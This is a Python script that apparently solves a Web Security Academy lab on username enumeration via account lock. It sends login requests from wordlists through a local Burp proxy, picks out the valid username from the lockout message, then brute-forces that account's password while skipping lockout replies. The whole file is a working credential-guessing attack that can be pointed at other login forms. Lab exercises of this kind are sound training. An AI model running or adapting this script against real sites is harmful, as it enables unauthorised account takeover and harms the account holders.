# The following is the authentication lab 05: Username enumeration via account lock
# Step 1: importing libraries.
import sys
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Step 2: Set the request parameters.
burp0_url = "https://0aa600360314f4ad85f5360c004d00e3.web-security-academy.net:443/login" #request url. 
burp0_cookies = {"session": "Trkmtzqn0dA3FoczrCikere6fYRWp7MC"} # user cookies.
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://0aa600360314f4ad85f5360c004d00e3.web-security-academy.net", "Referer": "https://0aa600360314f4ad85f5360c004d00e3.web-security-academy.net/login", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers"}# burp headers.

proxies =  {"http" : "http://127.0.0.1:8080/" , "https" : "http://127.0.0.1:8080/"} # this is proxy header .
# proxy header is added to the headers to allow the traffic to be redirected to the burp proxy.

# reading files to be assigned to a list of usernames and passowrds. 
with open("./username_lab05.txt", "r") as usernames:
	username = list(map(str.strip, usernames)) ## usernames list
with open("./passwords_lab05.txt", "r") as passwords:
	password = list(map(str.strip, passwords)) ## passwords list
	
for i in range (1,505,1):
    burp0_data = {"username": username[i], "password": password[i]} # The credentials attempted
    r = requests.post(url=burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxies, verify=False) # the post request to be sent
    if "Please" in r.text:
        print("The following is the real username: " + username[i])
        username_saved = username[i]
        for i in range(1,100,1):
            burp0_data = {"username": username_saved, "password": password[i]} # The credentials attempted
            r = requests.post(url=burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=proxies, verify=False) # the post request to be sent
            if "Invalid username or password." not in r.text: # this is the nested if to find the password for the found username.
                if "You have made too many incorrect login attempts. Please try again in 1 minute(s)." not in r.text:
                    print("The following is the password: " + password[i]) # this line will find the password associated with the given username.
                    sys.exit(-1) ## this is for finishing the code
